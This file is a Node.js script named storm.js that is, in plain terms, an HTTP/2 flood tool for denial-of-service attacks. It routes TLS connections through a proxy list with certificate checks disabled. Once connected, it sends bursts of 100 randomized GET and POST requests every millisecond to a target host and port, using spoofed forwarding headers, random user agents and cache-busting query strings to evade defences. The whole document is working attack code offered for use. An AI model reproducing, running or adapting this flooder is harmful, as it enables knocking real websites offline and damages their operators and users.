const fs = require("fs");
const http2 = require("http2");
const tls = require("tls");
const { randomBytes, createHash } = require("crypto");
const { URL } = require("url");

if (process.argv.length !== 5) {
    console.log("Usage : node storm.js <ip> <port> <time>");
    process.exit(1);
}

const target = process.argv[2];
const port = parseInt(process.argv[3]);
const duration = parseInt(process.argv[4]) * 1000;
const proxies = fs.readFileSync("proxies.txt", "utf-8").split("\n").filter(Boolean);
const userAgents = fs.readFileSync("ua.txt", "utf-8").split("\n").filter(Boolean);

const endTime = Date.now() + duration;
process.stdin.setRawMode(true);
process.stdin.resume();
process.stdin.on("data", () => {});

const parsedTarget = new URL(`https://${target}:${port}`);

function randomString(size) {
    return [...Array(size)].map(() => Math.random().toString(36)[2]).join("");
}

function getRandomUserAgent() {
    return userAgents[Math.floor(Math.random() * userAgents.length)];
}

function createHeaders(method = 'GET') {
    return {
        ":method": method,
        ":path": parsedTarget.pathname + "?" + randomString(10),
        "user-agent": getRandomUserAgent(),
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "cache-control": "no-cache",
        "connection": "keep-alive",
        "x-forwarded-for": randomString(12),
        "cookie": randomString(20),
        "referer": "https://www.google.com",
        "accept-language": "en-US,en;q=0.9",
    };
}

const tlsOptions = {
    host: parsedTarget.hostname,
    port: port,
    secure: true,
    ALPNProtocols: ["h2", "http/1.1"],
    ciphers: tls.getCiphers().join(":"),
    ecdhCurve: "X25519:prime256v1",
    rejectUnauthorized: false,
    servername: parsedTarget.hostname,
    secureProtocol: "TLSv1_3_method",
};

function startAttack() {
    console.log(`Attack started on ${target}:${port} for ${duration / 1000} seconds.`);
    const intervalId = setInterval(() => {
        if (Date.now() > endTime) {
            clearInterval(intervalId);
            console.log("Attack finished.");
            process.exit(0);
        }

        proxies.forEach((proxy) => {
            try {
                const [proxyHost, proxyPort] = proxy.split(":");

                const tlsConn = tls.connect(proxyPort || 443, proxyHost || parsedTarget.hostname, tlsOptions);
                tlsConn.setKeepAlive(true, 60000);

                const client = http2.connect(parsedTarget.href, {
                    protocol: "https:",
                    settings: {
                        headerTableSize: 65536,
                        maxConcurrentStreams: 2000,
                        initialWindowSize: 6291456,
                        maxHeaderListSize: 65536,
                        enablePush: false,
                    },
                    createConnection: () => tlsConn,
                });

                client.on("connect", () => {
                    const attackInterval = setInterval(() => {
                        if (Date.now() > endTime) {
                            clearInterval(attackInterval);
                            client.destroy();
                            return;
                        }

                        const headers = createHeaders();

                        for (let i = 0; i < 100; i++) {
                            const requestType = Math.random() > 0.5 ? 'GET' : 'POST';
                            const requestHeaders = createHeaders(requestType);

                            if (requestType === 'GET') {
                                const request = client.request(requestHeaders);
                                request.on("response", () => {
                                    request.close();
                                    request.destroy();
                                });
                                request.end();
                            } else {
                                const postRequest = client.request({
                                    ...requestHeaders,
                                    ":method": "POST",
                                    "content-type": "application/x-www-form-urlencoded",
                                });
                                postRequest.on("response", () => {
                                    postRequest.close();
                                    postRequest.destroy();
                                });
                                postRequest.write(`data=${randomBytes(512).toString("hex")}`);
                                postRequest.end();
                            }
                        }
                    }, 1);
                });

                client.on("error", () => client.destroy());
                client.on("close", () => client.destroy());
            } catch (error) {}
        });
    }, 1);
}

startAttack();